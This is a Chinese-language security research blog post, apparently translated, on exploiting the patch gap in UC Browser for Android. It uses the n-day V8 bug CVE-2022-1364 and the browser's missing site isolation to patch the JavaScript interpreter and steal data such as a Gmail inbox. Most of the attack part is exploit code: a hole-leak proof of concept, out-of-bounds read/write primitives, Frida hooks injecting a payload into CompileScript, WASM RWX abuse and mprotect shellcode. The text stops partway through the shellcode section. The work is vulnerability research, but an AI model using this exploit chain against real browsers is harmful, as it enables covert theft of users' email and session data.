#  UC浏览器一键内存损坏漏洞：利用V8补丁间隙漏洞窃取您的数据  
 Ots安全   2026-01-21 05:01  
  
**威胁简报**  
  
  
**恶意软件**  
  
  
**漏洞攻击**  
  
介绍  
  
最近主流浏览器都出现了一些故障，所以我们决定四处看看，除了常见的浏览器之外还有哪些选择。我们决定重点关注东方市场，并特别选择了QQ和UC浏览器作为潜在候选者，因为它们的市场份额较高。QQ的月活跃用户超过5亿，而UC的用户数量似乎在1亿到1.5亿之间。  
  
由于QQ的设置过程对西方用户来说有些麻烦（账号需要中国手机号码，所以我们不得不费一番周折，比如在Fiverr上找人帮我们注册账号），因此它很快就被淘汰了。这样一来，UC浏览器就成了我们的首选目标，也是本文余下部分将要重点介绍的对象。  
  
UC浏览器概述  
  
UC浏览器由UCWeb（阿里巴巴集团旗下子公司）积极开发。它在西方几乎无人问津，事实上，在开始这个项目之前，我们甚至都没听说过它。不过，它在印度、印度尼西亚和中国似乎相当受欢迎。这款浏览器主要针对移动应用进行支持和优化，我们未能找到桌面应用的更新版本。这意味着我们的研究主要集中在Android应用上。  
  
该浏览器的所有核心功能均依赖于谷歌Chrome浏览器，并主要致力于扩展其功能，例如改进的移动设备下载管理器、内置广告拦截和翻译功能等。这意味着其渲染器版本基于Chrome的Blink内核，稍后会详细介绍。  
  
另一点值得指出的是，UC浏览器过去曾发生过多起隐私泄露事件，其他研究团队也对此进行了记录。报告显示，UC浏览器曾采取措施将用户数据传输到外部服务器。这些先前的报告还表明，一些政府机构已经利用UC浏览器糟糕的安全/数据管理实践进行各种攻击。虽然我们本次研究项目并未重点关注浏览器的隐私问题，但如果您想进一步了解，可以阅读Citizen Lab关于此主题的一篇非常优秀的博文：https: //citizenlab.ca/2016/08/a-tough-nut-to-crack-look-privacy-and-security-issues-with-uc-browser/。  
  
项目启动  
  
所有测试均在运行 Android 16 的 Pixel 6a 上完成。查看提取的 APK 文件，其整体布局与 Chrome APK 非常相似（尽管它们不像 Chrome 那样使用拆分 APK，因此所有文件都列在一起）。大部分主要的浏览器引擎代码（也是我们此次研究的重点）位于一个名为 ` libwebviewuc.so`的 68 KB 库中。除此之外，还有一些额外的库，例如 ` libtorrent4j.so`，用于支持一些附加功能，但本次研究并未深入探讨这些库。  
  
启动浏览器后，它看起来与任何其他移动浏览器基本相同，只是针对其附加功能（例如广告拦截器或自定义下载器）进行了一些额外的设置。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeC4M3pg4ia9BBKA0IFToyFw9qBepuJKhIdRVRxeNiceH4GjxyueVZZjg4PVImXNWOq6Q49fGxcu3UA/640?wx_fmt=png&from=appmsg "")  
  
该浏览器没有源代码，并且完全剥离了所有功能，不包含任何调试符号，因此最初的想法是看看能否找到办法添加一些符号。我们之前有一些脚本，是基于 Chrome 的源代码/编译对象，用于为 Android 浏览器生成符号。我们尝试在 UC 上使用这些脚本，但不幸的是，UC 的布局/编译标志差异太大，无法快速适配这些脚本，因此不值得尝试。  
  
另一个想法是看看他们过去是否曾意外发布过未剥离依赖项的代码。为了验证这一点，我们编写了一个网络爬虫，从 ApkMirror 下载所有托管的 APK 文件，然后进行一些快速检查。实际上，他们确实错误地发布了一些不同版本中的单个库文件，但这些文件与我们的目的无关，因此这个想法也行不通。虽然这段代码肯定不是最简洁/最易于复用的，但我还是把它放在这里，以防有人能用得上。  
  
```
```py"""Script to download all apk-releases from apkmirror for uc-browser. Should be applicable to other apks on the website as well with some changes to the urls and the regexes depending on the app.Requires gui because downloads are performed by opening the final url in a web-browser to automatically start the download. May need to occasionally tick some "are you human" boxes to continue downloads."""import reimport requestsimport timeimport webbrowser# Default user agent to access siteuser_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36'mheaders = { 'User-Agent' : user_agent }# Number of pages on APKMirror that contain apps to download (5 for UC Browser)NUM_PAGES = 5deffetch_page(page_number):    fetch_url = ""    if page_number == 1:        fetch_url = "https://www.apkmirror.com/uploads/?appcategory=uc-browser"    else:        fetch_url = f"https://www.apkmirror.com/uploads/page/{page_number}/?appcategory=uc-browser"    r = requests.get(url = fetch_url, headers=mheaders)    if int(r.status_code) != 200:        print(f"Error 1 {r.status_code}: {r.text}")        return    return r.textdefhandle_page(dedup_set, page_number):    pattern = r'/apk/[\w-]+/[\w-]+/[\w-]+-[\d-]+-release'    data = fetch_page(page_number)    match = re.findall(pattern, data)    for x in match:        if"singapore"notin x:            continue        dedup_set.add(x)# Iterate through pages parsing request responses until # the final download url is founddefget_download_url(item):    base_url = "https://www.apkmirror.com"    full_url = base_url + str(item)    r = requests.get(url = full_url, headers=mheaders)    if int(r.status_code) != 200:        print(f"Error 2 {r.status_code}: {r.text}")        return    word = "download/"    pat = r'<span class=\"bubble p-static inlineBlock\".*?<a href="([^"]+)"'    match = re.findall(pat, r.text)[0]    pat2 = rf"^(.*?{re.escape(word)})"    next_url = base_url + re.match(pat2, match).group(1)    r = requests.get(url = next_url, headers=mheaders)    pat = r'btn-flat downloadButton.*?href="([^"]+)"'    match = re.findall(pat, r.text)[0]    final_url = base_url + match    return final_url# Perform the actual apk download by opening download url in browser new tabdefdownload(url):    webbrowser.open(url, new=2)defmain():    dedup_set = set()    # Iterate through all versions listed on APKMirror and compile     # the list into `dedup_set`    for page_number in range(1, NUM_PAGES):        print(f"[+] Handling page {page_number}")        handle_page(dedup_set, page_number)    for (i, item) in enumerate(dedup_set):        try:            res = get_download_url(item)            print(f"{i}: {res}")            with open("res.txt", "a") as f:                f.write(f"{str(res)}\n")            download(res)        except Exception as e:            print(f"{i} Failed on {item}")            print(e)        # Long wait between downloads to not get rate limited        time.sleep(120)if __name__ == "__main__":    main()```
```  
  
  
这使得对庞大的多线程浏览器代码库进行逆向工程变得极具挑战性，并且在项目后期调试利用漏洞过程中出现的各种崩溃问题时也造成了诸多复杂情况。关于这些调试难题，稍后会详细介绍。  
  
不过，目前这些问题暂且搁置。事实证明，UCWeb 似乎并没有很好地跟进其产品的 Chrome 安全更新。截至撰写本文时，Play 商店中的 UCBrowser 应用安装时使用的是 Chrome/123.0.6312.80 作为底层引擎，而 Android 的 Chrome 应用则使用 Chrome/140.0.0.0。UC 使用的版本是 2024 年 4 月的。这相当于近一年半的补丁更新间隔，足以让那些积极主动的漏洞研究人员利用各种漏洞进行跨版本漏洞利用。  
  
这使得下一步显而易见。查阅当时已知的 V8 CVE，找到一个能在 Android UC 浏览器上复现且有良好 POC 的漏洞。然而，V8 CVE 通常遵循相当固定的模式，本身并不足以写成一篇有趣的博客文章，尤其是在重复使用已有的 n 天 POC 的情况下。进一步的信息收集揭示了另一个有趣的信息：该浏览器不支持 Chrome 的站点隔离机制。所有渲染标签页都在同一个进程中运行，这意味着在一个标签页中发现的远程代码执行漏洞可以用来访问所有其他标签页中的信息。  
  
通常，基于浏览器的后渗透攻击流程是：先利用 V8 漏洞，再利用沙箱漏洞获取操作系统完全访问权限。然而，即使有现有的概念验证，在完全精简的浏览器上进行这种攻击也相当繁琐。此外，沙箱逃逸技术在公开领域已被广泛研究，因此，考虑到缺乏站点隔离，我们决定探索一些不涉及沙箱漏洞的后渗透攻击方法。  
  
本文的其余部分将简要介绍 RCE 中的任意读/写原语，然后深入探讨非沙箱式后渗透，以从电子邮件收件箱中提取数据。  
  
V8漏洞利用  
  
为了避免公开影响数百万用户的零日漏洞，本次攻击将针对稍旧版本的浏览器，使用 CVE-2022-1364 漏洞。即使在最新版本的浏览器中，也未观察到站点隔离，因此本文探讨的所有主题仍然适用。  
  
如前所述，本次选择的远程代码执行漏洞是 CVE-2022-1364。之所以选择此漏洞，是因为它可以在 UC 上完美复现，并且已有非常优秀的公开概念验证 (POC) 文档。该漏洞已在 Chrome/100.0.4896.127 版本中修复，该版本于 2022 年 4 月发布。然而，同样的安全更新直到 2024 年底才推送至 UC，这再次表明攻击者可以利用补丁更新带来的巨大漏洞空档期。  
  
漏洞概述  
  
初始内存损坏 POC 改编自https://github.com/anvbis/chrome_v8_ndays/blob/master/cve-2022-1364.js。  
  
内存损坏漏洞的核心思想是，两个对象可以被分配到同一个后端存储。其中一个对象的元素可以被转换为“空洞元素类型”，而另一个对象则保持“打包”状态，从而允许攻击者泄露“空洞”值。在下面的 POC 示例中，您可以在第 30 行和第 31 行看到此漏洞的执行。此漏洞可以使用此处列出的常用方法进行利用：https://issues.chromium.org/issues/40057710。  
  
这两个对象的生成基于涡扇内存逃逸分析漏洞。逃逸分析是一种优化机制，旨在避免分配仅限于堆上局部上下文的对象。即使经过逃逸分析优化，也需要有相应的机制来恢复对象信息，以防反优化或需要堆栈跟踪。在下面的 POC 示例的第 6 行中，` getThis`函数正是用于实现这一概念。每次调用该函数时，都需要将优化后的内存分配物化，从而创建对象的多个实例。  
  
随后，该思路被应用于漏洞利用程序中的 ` ArgumentsObject`对象。在这种情况下，在第 20 行，优化器判定该对象可以通过逃逸分析被非物质化，但其后备存储却无法被非物质化，因为对后备存储的访问会“逃逸”第 21 行的函数。这一点，再加上之前提到的获取已物质化对象多个实例的方法，导致多个对象指向同一个后备存储，这些对象可以被独立修改，从而造成进一步的内存破坏。  
  
我不会深入探讨如何生成指向同一后端存储的两个对象，因为这并非本文的重点。我们之所以选择这个漏洞，是因为已经有很好的远程代码执行 (RCE) 概念验证 (POC) 可供参考。如果您有兴趣了解更多信息，可以参考原始漏洞报告和以下简要说明：https://issues.chromium.org/issues/40059369和https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2022/CVE-2022-1364.html。  
  
初始孔泄漏  
  
```
```js  functionfoo() {      const _x = a => (a => a.x())(a);      const _y = (a, b) => b.y(a, b, 1);      const _z = i => {          Error.prepareStackTrace = (_, x) => x[i].getThis();          returnError().stack;      };     functionX() {}     X.prototype.x = () => {         let z = _z(3);         z[0] = 0;         e = { x: z, y: _z(3) };         };     X.prototype.y = function(a, b) {         'use strict';         _x.call(arguments, b);         returnarguments[a];     }     let e = null;     let x = new X();     for (let i = 0; i < 10000; i++)         _y(1, x);     delete e.x[0];     return e.y[0]; // Returns the hole value }```
```  
  
  
现在，剩余的 V8 漏洞利用原语的设置相当简单。如前文所述，利用漏洞泄漏可以生成一个长度非常大的数组，从而实现越界访问。之后，可以利用对象/浮点数组类型混淆来生成 ` addr_of`、` arb_read`和 ` arb_write`原语。您可以在其他文章中了解更多关于这些方法的信息，例如我之前写的一篇关于 V8 漏洞利用的文章（https://seal9055.com/ctf-writeups/browser_exploitation/download_horsepower）。本文篇幅有限，无法详细介绍这些方法。  
  
漏洞利用到 OOB 数组和漏洞利用原语  
  
```
```jsfunctionbar() {    let hole = foo();    let m = newMap();    m.set(1, 1);    m.set(hole, 1);    m.delete(hole);    m.delete(hole);    m.delete(1);    let a = newArray(1.1, 2.2);    m.set(16, -1);    m.set(a, 1337);     return a;}let oob = bar();let _ = [1.1]let tmp = {a: 1};let leak_obj = [tmp];let buf = newArrayBuffer(0x100);let view = newDataView(buf);/// Address-Of Primitive/// Pass object as argument to retrieve object addressfunctionaddr_of(obj) {    leak_obj[0] = obj;    return (ftoi(oob[25]) - 1n);}/// Arbitrary-Read Primitive/// Perform a 4-byte memory read at `addr` and return 32-bit integerfunctionarb_read(addr) {    let saved_addr = oob[34];    oob[34] = itof(addr);    let ret = view.getUint32(0x0, true);    oob[34] = saved_addr;    return ret;}/// Arbitrary-Write Primitive/// Write 32-bit value `val` to `addr`functionarb_write(addr, val) {    let saved_addr = oob[34];    oob[34] = itof(addr);    view.setUint32(0, val);    oob[34] = saved_addr;}```
```  
  
  
后渗透简介  
  
至此，我们已经可以在 V8 代码空间内进行任意读写操作。接下来有两种方法：一是逃逸沙箱，二是利用沙箱内部可访问的功能。本文将重点讨论较少被探索的第二种方法。  
  
根据浏览器及其渲染器级别的安全缓解措施，有几种不同的选择。其中大多数通常依赖于绕过 CORS/SOP 来与其他页面交互。  
  
遗憾的是，关于这个主题的博客文章非常少，即使在Interrupt Labs内部，由于漏洞利用通常只是从V8远程代码执行（RCE）过渡到沙箱漏洞利用，因此过去很少有研究人员深入研究过这个问题。即便如此，以下是我在研究过程中发现的最有帮助的资源：  
  
1. Amy Burnett - BlueHat IL 2020 - 忘记沙盒逃逸：利用浏览器进行代码执行（https://www.youtube.com/watch?v=a0yPYpmUpIA）  
  
2. 腾讯安全玄武实验室 - Blackhat Asia 2024 - 沙箱漏洞：从站点隔离的角度逃离现代基于 Web 的应用沙箱 ( https://i.blackhat.com/Asia-24/Presentations/Asia-24-Liu-The-Hole-in-Sandbox.pdf )  
  
Amy 列举了几种绕过 Safari 和 Firefox 这些缓解措施的方法。这些方法（至少在演示时）比较容易绕过，因为这两个浏览器都将部分检查集成到了实际的渲染进程中。这意味着任何允许在渲染器中进行任意读/写操作的漏洞，都可以修改用于检查 CORS 的变量，或者直接修改 SOP 检查函数使其始终通过。例如，Safari 就是通过 ` m_universalAccess`变量进行检查的。我这里用的是过去时，因为我相信自 2020 年以来，很多方面都发生了变化/加强了，但我最近没有研究过这些浏览器，所以无法确定现在的难度有多大。她还演示了一些基于 iframe 和 Service Worker 的其他非常有趣的技术，如果您对这个主题感兴趣，我强烈建议您去看看。  
  
遗憾的是，这些方法都不直接适用于 Chrome 浏览器。早在 2020 年，谷歌就已经部署了更先进的安全措施。在 Chrome 中，这些措施是通过沙箱向特权进程发送进程间通信 (IPC) 请求来实现的，该进程会验证这些请求的有效性，然后才允许访问。这意味着所有基于修改变量/函数的方案都不再适用。  
  
幸运的是，我们在腾讯的 Blackhat 大会演讲中发现了一个非常有趣的想法。这个方法既适用于安卓系统上较旧的 Chrome 版本（这些版本的 Chrome 的站点隔离功能存在一些问题，无法隔离所有网站，他们的演示是在 90.0.4430.61 上进行的），也适用于根本没有站点隔离功能的 UC 浏览器！这项技术基于利用任意读写权限来修改解释器。这个补丁会修改解释执行的 JavaScript 代码，添加一个 UXSS 攻击载荷。完整的攻击流程可能如下所示：  
  
1. 受害者打开攻击者的网站  
  
2. 攻击者控制的网站触发了渲染器中的某些漏洞，从而允许在渲染器进程内进行任意的读取/写入/执行操作。  
  
3. 部署解释器补丁  
  
   3a. 查找 ` libwebviewuc.so`的基地址（包含解释器代码的主 Chrome 库）。  
  
   3b. 调用 ` mprotect` shellcode 将解释器部分设置为读写执行 (rwx) 权限。  
  
   3c. 使用任意写入来修补函数，将我们的 UXSS 有效载荷附加到通过解释器的 Javascript 代码中。  
  
4. 用户打开任意感兴趣的网站（例如演示后面显示的电子邮件收件箱），该网站会通过打过补丁的解释器进行处理，从而实现完整的数据提取，而无需处理任何 SOP/CORS 保护。  
  
在此之前，我们从未在其他地方看到过这种类型的漏洞利用方法，而且演讲中也没有提供任何代码示例，因此我们决定进一步研究这个想法，这或许会带来一些有趣的发现。尤其考虑到我们的目标是一个相当热门且极易受到这种漏洞攻击的攻击目标。  
  
后剥削时代：弗里达前来救援  
  
我在博文前面提到过这个项目中遇到的各种调试难题。现在是时候详细说说这些难题以及我们用来应对它们的一些方法了。  
  
第一个问题是所有符号都被完全剥离了。这个问题很遗憾，我们之前在博文中尝试过解决，但并不容易，看来我们只能在整个项目中处理这个问题了。  
  
第二个问题是，GDB 在这个浏览器上完全无法使用。不幸的是，这才是更大的问题。这意味着，对于之前讨论的 V8 RCE 漏洞利用，我们没有可用的调试器来确定精确的偏移量；也意味着，现在当我们开始处理 shellcode 和函数修补时，我们也没有可用的调试器来直接验证我们的指令是否有效。我们花了一些时间试图找出问题的根源，但最终的结论是，浏览器的一些功能实现得非常糟糕，导致当调试器介入时，线程就会开始争用，最终导致浏览器中不同部分/进程崩溃。我们确实怀疑过可能存在一些反调试代码，故意给我们制造麻烦，但我们尝试了之前在 CTF 比赛中见过的一些方法，似乎都不适用。话虽如此，我们当然有可能忽略了这一点，而这些调试器导致的崩溃实际上是浏览器开发者有意为之。  
  
在项目进行到相当长的一段时间后，我的解决方案最终是利用崩溃日志进行调试。具体来说，就是在 shellcode 的不同部分故意引入段错误，从而自动生成崩溃日志。这些日志会显示崩溃时的寄存器值以及每个寄存器周围的内存信息，便于进行大量的数据分析。然而，即使是这些崩溃日志也会被浏览器自动加密。幸运的是，浏览器会先将日志写入磁盘，然后再进行加密并删除未加密的版本，因此，只需编写一个简单的 bash 脚本，在崩溃日志生成后立即将其保存到其他位置，就能解决这个问题。  
  
```
```sh#!/bin/shrm crash_logwhiletrue; do    cat /data/data/com.UCMobile.intl/crash/*.log >> crash_log    sleep 1done```
```  
  
  
这种调试方法效果还不错，但是每次更改后的迭代速度都很慢，因为我们需要编辑漏洞利用程序来强制崩溃，生成崩溃日志，然后再查看崩溃日志，而崩溃日志中的信息仍然有些有限。  
  
现在，熟悉安卓漏洞研究的人可能会很困惑，我为什么要费这么大劲。为什么不直接用 Frida 呢？他们的想法很有道理。在此之前，我对安卓开发了解不多，而且就 DBI 框架而言，我只用过 Pin、Dynamorio 和 Unicorn，所以 Frida 根本不在我的考虑范围之内，直到一位同事建议我看看。这对这个项目来说意义重大，无论是调试还是为剩余的漏洞利用程序进行原型设计，都带来了极大的便利。Frida 提供了丰富的 API，可以通过 ADB 连接轻松附加到进程，并且还提供了读取/写入内存地址、获取库地址等诸多功能。  
  
以下脚本展示了如何进行设置，以及如何使用 Frida 的 API 轻松收集崩溃日志及其他信息。这在整个漏洞利用过程中都非常有用。  
  
```
```pyimport fridaimport sysdefon_message(message, data):    print("[%s] => %s" % (message, data))defmain():    #session = frida.get_usb_device().attach("UC Browser")    # Attach directly through pid of renderer process, otherwise     # frida often attaches to an unwanted process instead    session = frida.get_usb_device().attach(29062)    script = session.create_script("""        function hex(val) {            return "0x" + val.toString(16);        }        const libwebview_base = Number(Module.findBaseAddress("libwebviewuc.so"));        const compile_str_addr = libwebview_base + 0x01eead28;        console.log("[+] Libwebview Base-address: " + hex(libwebview_base));        console.log("[+] CompileString addr: " + hex(compile_str_addr));        function dump(addr) {            console.log("[+] Dumping " + addr);            const data = Memory.readByteArray(addr, 200);            console.log("------------------------------");            console.log(hexdump(data, {                offset: 0,                length: 200,                header: true,                ansi: true            }));            console.log("------------------------------");        }        console.log("Hooking sc");        Interceptor.attach(ptr(0x41410200), {            onEnter(args) {                send("enter1");                try { console.log("[+] arg0: " + hex(args[0])); } catch {}                try { console.log("[+] arg1: " + hex(args[1])); } catch {}                let a0_0 = ptr(Memory.readU64(ptr(Number(args[1]) + 0)))                let a0_8 = ptr(Memory.readU64(ptr(Number(args[1]) + 8)))                dump(a0_0)                dump(a0_8)            }        });    """)    script.on('message', on_message)    script.load()    sys.stdin.read()if __name__ == '__main__':    main()
```  
  
  
此外，Frida 在此次漏洞利用的另一个重要方面——原型设计——也发挥了极其重要的作用。之前我描述过，整个利用过程需要各种不同的 shellcode 分配、` mmap`调用等等。这是一个相当复杂的过程，所有这一切都基于我们在一个演示文稿中看到的想法，而我们甚至不确定这个想法能否在我们的目标上 100% 奏效。Frida 在这里帮了大忙，因为它省去了所有中间步骤，使我们能够直接跳到最后一步。下面的 Frida 脚本正是如此。它首先获取 `libwebviewuc.so` 的基地址，并用它来计算 ` CompileScript`函数的地址。这是我们选择的函数，它在 V8 解释器中接受一个 JavaScript 字符串作为参数。接下来，使用 ` Interceptor.attach` API 将此函数与 Frida 的 `Memory.readU64` 和 `Memory.writeByteArray` API 连接起来，以模拟漏洞利用程序的任意读写操作。这些用于遍历几个参数指针，以找到实际的字符串位置，然后使用我们的 Javascript 有效负载编辑字符串。  
  
`find_entrypoint` 函数用于确保我们覆盖的是正确的 JS 代码片段。真实的网站显然包含大量无法正常运行的 JavaScript 代码，因此我们需要确保不会覆盖对网站执行至关重要的 JavaScript 代码。在本例中，我们覆盖的是一些与广告相关的代码，这些代码似乎不会影响网站的执行。最佳的覆盖代码片段是通过反复试验找到的，并且会因攻击目标网站的不同而有所差异。在本例中，目标是 Gmail。根据以下代码，有效载荷插入的某些部分可能还不太容易理解（例如`';'.repeat(0x929-0xd+0x53-js_payload.length`）。这些内容将在后续的实际攻击过程中进行详细解释。  
  
```
```pyimport fridaimport sysdefon_message(message, data):    print("[%s] => %s" % (message, data))defmain():    script = session.create_script("""        function hex(val) {            return "0x" + val.toString(16);        }        v8_V8ScriptRunner_CompileScript_offset = 0x31c2ae8;        const libwebview_base = Number(Module.findBaseAddress("libwebviewuc.so"));        const compile_script_addr = libwebview_base + v8_V8ScriptRunner_CompileScript_offset;                console.log("[+] Libwebview Base-address: " + hex(libwebview_base));        console.log("[+] CompileSscript addr: " + hex(compile_script_addr));        const data = Memory.readByteArray(ptr(libwebview_base + 0x31c2ae8), 0x100);                console.log(hexdump(data, {                    offset: 0,                    length: 0x100,                    header: true,                    ansi: true                }));        function dump(addr) {            console.log("[+] Dumping " + addr);            const data = Memory.readByteArray(addr, 3000);            console.log("------------------------------");            console.log(hexdump(data, {                offset: 0,                length: 3000,                header: true,                ansi: true            }));            console.log("------------------------------");        }        function arrayBufferToString(buffer) {            return String.fromCharCode.apply(null, new Uint8Array(buffer));        }        function str_to_arr(str) {            var utf8 = [];            for (var i = 0; i < str.length; i++) {                var charcode = str.charCodeAt(i);                if (charcode < 0x80) {                    utf8.push(charcode);                } else if (charcode < 0x800) {                    utf8.push(0xc0 | (charcode >> 6),                              0x80 | (charcode & 0x3f));                } else if (charcode < 0xd800 || charcode >= 0xe000) {                    utf8.push(0xe0 | (charcode >> 12),                              0x80 | ((charcode >> 6) & 0x3f),                              0x80 | (charcode & 0x3f));                } else {                    // surrogate pair                    i++;                    // UTF-16 to UTF-8 conversion                    var surrogatePair = 0x10000 + (((charcode & 0x3ff) << 10)                                      | (str.charCodeAt(i) & 0x3ff));                    utf8.push(0xf0 | (surrogatePair >> 18),                              0x80 | ((surrogatePair >> 12) & 0x3f),                              0x80 | ((surrogatePair >> 6) & 0x3f),                              0x80 | (surrogatePair & 0x3f));                }            }            return utf8;        }        function find_entrypoint(addr, s) {            const data = Memory.readByteArray(addr, 500);            let as_str = arrayBufferToString(data);            if (as_str.includes(s)) {                console.log(as_str);                console.log(data)                return true;            }            return false;        }        let js_payload = `        alert('XSS Accomplished');        `        Interceptor.attach(ptr(compile_script_addr), {            onEnter(args) {                let arg2 = args[1];                let arg2_deref = ptr(Memory.readU64(ptr(Number(arg2))))                let arg2_deref_deref = Memory.readU64(ptr(Number(arg2_deref) + 56))                if (find_entrypoint(ptr(arg2_deref_deref), "unsubscribe")) {                    let js_starting_pos = arg2_deref_deref + 0xd;                    dump(ptr(arg2_deref_deref))                    console.log("Intercepted");                     Memory.writeByteArray(ptr(js_starting_pos), str_to_arr(js_payload));                    Memory.writeByteArray(                        ptr(js_starting_pos+js_payload.length), str_to_arr(';'.repeat(0x929-0xd+0x53-js_payload.length)))                    dump(ptr(arg2_deref_deref))                }            }        });    """)    script.on('message', on_message)    script.load()    sys.stdin.read()session = frida.get_usb_device().attach(<renderer-pid>)if __name__ == '__main__':    main()```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeC4M3pg4ia9BBKA0IFToyFwnooVs20TGdf4f6GzVvmawaunOX9OJTqGkGshvQn2VXU4cbkiafcvGqg/640?wx_fmt=png&from=appmsg "")  
  
从截图中可以看到，` find_entrypoint`函数成功找到了我们要覆盖的 js 字符串，现在可以用我们的 js 有效载荷覆盖它了。我手头没有当时的截图了，但有效载荷在这里成功触发，证明了这种方法的可行性。另外值得注意的是，我们选择覆盖现有的 js 字符串，而不是追加到现有字符串，这样可以最大限度地减少改动。我们希望避免编辑字符串的所有长度字段和其他元数据，因此用相同长度的字符串覆盖它是最简单的方法。现在是时候把 Frida 交还给调试工具，然后继续完成实际的漏洞利用了。  
  
后渗透实施  
  
让我们总结一下我们的目标：  
1. 我们有 ` arb_read`、` arb_write`和 ` addr_of`这几个原语，但仍然需要读写执行权限。为此，我们将使用一些带有读写执行权限页面的 WebAssembly 实例。  
  
1. 我们需要编写我们的 js-payload，并使用 V8 漏洞利用原语来获取实际字符串的地址。  
  
1. 我们需要编写一些 shellcode，给定编译过程中原始 js 字符串的地址和我们的 js 字符串有效载荷的地址，检查它是否是正确的要覆盖的 js 字符串，并执行实际的 memcpy 操作。  
  
1. 我们需要找到 ` CompileScript`函数的地址，使其可写，并重写其中的一些指令，以便将钩子插入到我们的 shellcode 中。  
  
1. 所有这些操作都需要顺利执行，并在最后恢复到正常的浏览器运行状态。  
  
简单回顾一下我们上次在实际漏洞利用代码上的步骤：V8 漏洞已触发，并设置了提供 addr_of、arb_read 和 arb_write 原语的函数。接下来，我们将分配两个读写执行 (rwx) 区域，并获取这些 rwx 代码区域的地址。然后，就像我们在 Frida 部分所做的那样，我们需要获取 ` libwebviewuc.so`库的基地址。在这种情况下，我们不能依赖 Frida API，所以我们找到一个我们可访问的对象中包含的地址，该地址指向 ` libwebviewuc.so`中的某个偏移量，并用它来计算基地址。  
  
最后，我们还使用 `addr_of` 原语来获取 `js_payload` 的地址。稍后在解释器补丁中，我们将使用这个字符串来覆盖一个 JavaScript 字符串。稍后我会详细介绍实际的 JavaScript 有效负载。  
  
```
```jsconst libwebview_base_offset = 0x41de800n/// Max size for rwx region seems to be 0x30 bytes, so I need multiple rwx regions for all the shellcodelet wasm_code1 = newUint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);let wasm_module1 = new WebAssembly.Module(wasm_code1);let wasm_instance1 = new WebAssembly.Instance(wasm_module1,{});let f1 = wasm_instance1.exports.main;let wasm_code2 = newUint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);let wasm_module2 = new WebAssembly.Module(wasm_code2);let wasm_instance2 = new WebAssembly.Instance(wasm_module2,{});let f2 = wasm_instance2.exports.main;functionexploit() {    //...    print("[+] OOB Array Created: length=" + oob.length);    let rwx_page1 = BigInt(arb_read(addr_of(wasm_instance1) + 0x7Cn)) - 0x4n;    let rwx_page2 = arb_read(addr_of(wasm_instance1) + 0x80n);    let rwx_addr = (rwx_page1 << 32n) + BigInt(rwx_page2)    print("[+] RWX Page: " + hex(rwx_addr));    let rwx_page1b = BigInt(arb_read(addr_of(wasm_instance2) + 0x7Cn)) - 0x7n;    let rwx_page2b = arb_read(addr_of(wasm_instance2) + 0x80n);    let rwx_addr2 = (rwx_page1b << 32n) + BigInt(rwx_page2b)    print("[+] RWX Page2: " + hex(rwx_addr2));    print("[+] `document` Address: " + hex(addr_of(document)));    let lower_base = BigInt(arb_read(addr_of(document) + 0x18n))    let upper_base = BigInt(arb_read(addr_of(document) + 0x1Cn))    let libwebview_base = ((upper_base << 32n) + lower_base) - libwebview_base_offset;    print("[+] Libwebview-Base: " + hex(libwebview_base));    let js_payload = `        ...    `    // Retrieve address of the js-payload string    let js_payload_addr = 0x0n;    {        let wrap_addr = addr_of(js_payload);        js_payload_addr = wrap_addr + 0x10n;        print("[+] JS payload address leaked: " + hex(js_payload_addr));    }    //...}```
```  
  
  
接下来，我们开始编写一些设置用的 shellcode。由于漏洞利用程序剩余部分需要编写相当长的 shellcode，因此有限的 WASM 区域无法满足需求。我们将首先在 ` 0x41410000`处分配一个读写执行 (rwx) 区域，然后设置一个小型跳转函数，以便我们可以从漏洞利用程序中调用该跳转函数来执行 shellcode，然后返回到正确的解释器执行，而不会崩溃。  
  
```
```js    // f1: Allocate RWX region at 0x41410000    {        /*           ; Allocate data region to pass values to shellcode           mov x0, #0x41410000           mov x1, #0x1000 // #4096           mov x2, #0x7 // #7           mov x8, #0xe2 // #226 (mprotect)           svc #0x0        */        let sc = [i_mov_x0_0x41410000, i_mov_x1_0x1000, i_mov_x2_0x7, i_mov_x8_0xe2, i_svc_0x0];        let rwx_cur_offset = 0n;        for (let i = 0; i < sc.length; i++) {            arb_write(rwx_addr + rwx_cur_offset , sc[i]);            rwx_cur_offset += 0x4n;        }        arb_write(rwx_addr + rwx_cur_offset, ret_instr);    }    // This allocates an rwx region at 0x41410000 that we can use to execute the rest of our    // shellcode. This is necessary because wasm rwx regions have size limit    {        print("[+] Calling f1");        f1();        print("[+] Returned from f1");    }    // f2: Stub that calls our shellcode at 0x41410000 and handles correct return to the js engine    {        /*           ; Shellcode to jump to larger shellcode region           mov x0, #0x41410000           br x0 <return to js engine>        */        let sc = [i_mov_x0_0x41410000, i_br_x0, ret_instr];        arb_write(rwx_addr2 + 0x0n, sc[0]);        arb_write(rwx_addr2 + 0x4n, sc[1]);        arb_write(rwx_addr2 + 0x8n, sc[2]);    }```
```  
  
  
现在，我们开始编写实际的 shellcode。这段代码将被修改后的 ` CompileScript`函数调用。它基本上执行了 Frida 原型中` Interceptor.attach`代码的所有功能。  
  
` start_seq`将作为我们 shellcode 的入口点。它会在栈上腾出一些空间，并保存一些寄存器，这些寄存器将在 shellcode 中被覆盖。  
  
该补丁覆盖了 ` CompileScript`函数中的一些指令以启用我们的钩子，因此 ` ret_seq`确保既能调用这些缺失的指令，又能利用之前 ` start_seq`腾出的空间恢复被我们的 shellcode 覆盖的寄存器。这保证了在我们的 shellcode 执行完毕后，解释器可以继续正常运行。  
  
